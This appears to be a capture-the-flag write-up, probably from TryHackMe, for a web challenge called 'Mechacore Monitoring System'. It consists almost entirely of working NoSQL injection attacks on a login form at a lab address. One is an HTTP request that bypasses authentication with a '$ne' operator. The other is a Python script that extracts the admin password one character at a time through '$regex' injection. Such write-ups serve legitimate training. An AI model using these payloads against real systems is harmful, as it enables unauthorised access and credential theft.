---
title: "Mechacore Monitoring System"
category: Web Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 60
solves: -1
flags: 
 - THM{REDACTED}
 - THM{REDACTED}
---
> Mechacore again? Why do they keep buying from this brand? This looks like a monitoring system for one of Virelia's plants. We've bypassed their logins before, so let's do it once again. Maybe we can even try dumping the database for passwords this time.

---

## App flag

```http
POST /login.php HTTP/1.1
Host: 10.10.191.255
Content-Type: application/x-www-form-urlencoded

user=admin&pass[$ne]=admin
```

## Admin flag

```py
import requests
import string

URL = 'http://10.10.191.255/login.php'
charset = '{_}' + string.ascii_letters + string.digits + string.punctuation
found = 'THM{'
session = requests.Session()

while True:
    for ch in charset:
        trial = found + ch
        data = {
            'user': 'admin',
            'pass[$regex]': f'^{trial}'
        }
        r = session.post(URL, data=data, allow_redirects=False)

        if '/?err=1' not in r.headers.get('Location', ''):
            found += ch
            print(f'Found so far: {found}')
            break
    else:
        print(f'Final password: {found}')
        break
```
